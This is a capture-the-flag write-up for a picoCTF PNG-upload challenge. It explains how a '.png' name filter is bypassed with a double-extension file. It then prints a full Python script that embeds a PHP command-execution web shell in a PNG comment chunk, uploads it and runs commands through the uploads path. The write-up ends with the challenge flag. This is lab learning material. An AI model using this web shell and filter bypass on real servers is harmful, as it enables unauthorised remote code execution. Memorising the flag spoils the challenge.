
---

#### Description

I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:63196/)!

---

When I first entered the site this is what I got:
![[Pasted image 20260304211852.png]]
I could upload files, but they had to be `.png`.
![[Pasted image 20260304211950.png]]

I tried to upload a file named `payload.png.php` to see if it worked, and it kind of worked.
![[Pasted image 20260304212125.png]]
So on the server side there is a filter that only accepts files with `.png` in the name — that is easy to bypass.

After uploading a PNG file I wanted to see if the uploads were visible. I dug around a bit and found that `/uploads/{FILENAME}` was accessible.

With that in mind I created `payload.png.php` to bypass the filename filter, while keeping it a valid PNG and embedding the PHP payload in a comment chunk.

```python
import re
import time

import requests
from PIL import Image, PngImagePlugin

BOLD = "\033[1m"
URL = "http://atlas.picoctf.net"
PORT = "60536"
FULL_URL = f"{URL}:{PORT}"
FILENAME = "payload.png.php"


def createImage():
    img = Image.new("RGB", (32, 32), (255, 255, 255))
    meta = PngImagePlugin.PngInfo()
    meta.add_text(
        "Comment",
        '<?php echo "BEGIN\n"; system($_GET["cmd"] ?? "id"); system("cd ..;ls -al;cat GQ4DOOBVMMYGK.txt");echo "\nEND"; exit; ?>',
    )
    img.save(FILENAME, "PNG", pnginfo=meta)


def get_file():
    possible_endpoint = f"/uploads/{FILENAME}"
    response2 = requests.get(f"{FULL_URL}{possible_endpoint}?cmd=ls")
    print(response2.text)


def upload():
    with open(FILENAME, "rb") as f:
        files = {"file": (FILENAME, f, "image/png")}
        response1 = requests.post(FULL_URL, files=files)
        m = re.search(r"does not", response1.text)
        print(m)
        if response1.status_code == 200 and not m:
            print(BOLD + "Upload successful")
        else:
            print(BOLD + "Wrong name")
            f.close()
            exit(-1)


def main():
    createImage()
    upload()
    print(BOLD + "[x] Sleeping 1s")
    time.sleep(1)
    get_file()


if __name__ == "__main__":
    main()

```

I wrote this script to automate the whole process.

When running it I got the flag.

![[Pasted image 20260304212551.png]]

## FLAG
```flag
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}
```

---